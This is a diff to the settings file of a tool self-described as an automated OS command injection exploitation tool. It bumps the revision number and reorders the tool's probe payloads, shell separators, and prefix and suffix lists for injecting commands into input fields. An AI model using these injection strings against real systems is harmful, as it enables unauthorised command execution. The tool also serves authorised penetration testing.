@@ -225,7 +225,7 @@ DESCRIPTION_FULL = "Automated All-in-One OS Command Injection Exploitation Tool"
 DESCRIPTION = "The command injection exploiter"
 AUTHOR  = "Anastasios Stasinopoulos"
 VERSION_NUM = "3.5"
-REVISION = "13"
+REVISION = "14"
 STABLE_RELEASE = False
 if STABLE_RELEASE:
   VERSION = "v" + VERSION_NUM + "-stable"
@@ -268,8 +268,8 @@ VALUE_BOUNDARIES = r'[\\/](.+?)[\\/]'
 RAND_A = random.randint(1,10000)
 RAND_B = random.randint(1,10000)
 BASIC_STRING = str(RAND_A) + "+" + str(RAND_B)
-BASIC_COMMAND_INJECTION_PAYLOADS = [_urllib.parse.quote_plus(";echo $((" + BASIC_STRING + "))&&echo $((" + BASIC_STRING + "))||echo $((" + BASIC_STRING + "))"),
-                                   _urllib.parse.quote_plus("|set /a (" + BASIC_STRING + ")&set /a (" + BASIC_STRING + ")")
+BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $((" + BASIC_STRING + "))&&echo $((" + BASIC_STRING + "))||echo $((" + BASIC_STRING + "))",
+                                   "|set /a (" + BASIC_STRING + ")&set /a (" + BASIC_STRING + ")"
                                    ]
 BASIC_COMMAND_INJECTION_RESULT = str(RAND_A + RAND_B)
 IDENTIFIED_COMMAND_INJECTION = False
@@ -388,22 +388,22 @@ HTTP_HEADER = ""
 
 # The command injection separators.
 SEPARATORS = []
-SPECIAL_SEPARATORS = ["%0a", "%0d%0a","%1a"]
-DEFAULT_SEPARATORS = ["", ";", "&", "&&", "|", "||"]
+DEFAULT_SEPARATORS = [";", "&", "|"]
+SPECIAL_SEPARATORS = ["&&", "||", "%0a", "%0d%0a", "%1a"]
 SEPARATORS_LVL1 = DEFAULT_SEPARATORS + SPECIAL_SEPARATORS  
-SEPARATORS_LVL3 = SEPARATORS_LVL2 = DEFAULT_SEPARATORS + SPECIAL_SEPARATORS + [_urllib.parse.quote_plus(x).lower() for x in DEFAULT_SEPARATORS]
+SEPARATORS_LVL3 = SEPARATORS_LVL2 = SEPARATORS_LVL1
 
 # The command injection prefixes.
 PREFIXES = []
 PREFIXES_LVL1 = [""]
-PREFIXES_LVL2  = PREFIXES_LVL1 + [" ", "'", "\"", "&", "|", "'&"]
-PREFIXES_LVL3  = PREFIXES_LVL2 + [_urllib.parse.quote_plus(x).lower() for x in PREFIXES_LVL2]
+PREFIXES_LVL2  = SEPARATORS_LVL1
+PREFIXES_LVL3  = ["'", "\""] + PREFIXES_LVL2
 
 # The command injection suffixes.
 SUFFIXES = []
-SUFFIXES_LVL1 = [""]
-SUFFIXES_LVL2 = SUFFIXES_LVL1 + ["'", "\"", "&&", "|", "||", " #", "//", "\\\\", "&'"]
-SUFFIXES_LVL3 = SUFFIXES_LVL2 + [_urllib.parse.quote_plus(x).lower() for x in SUFFIXES_LVL1]
+SUFFIXES_LVL1 = DEFAULT_SEPARATORS
+SUFFIXES_LVL2 = SEPARATORS_LVL1
+SUFFIXES_LVL3 = ["'", "\"", " #", "//", "\\\\"] + SUFFIXES_LVL2
 
 # Bad combination of prefix and separator
 JUNK_COMBINATION = ["&&&", "|||", "|&&", "&|", "&;", "|;", "%7C;", "%26;", "%7C&"]
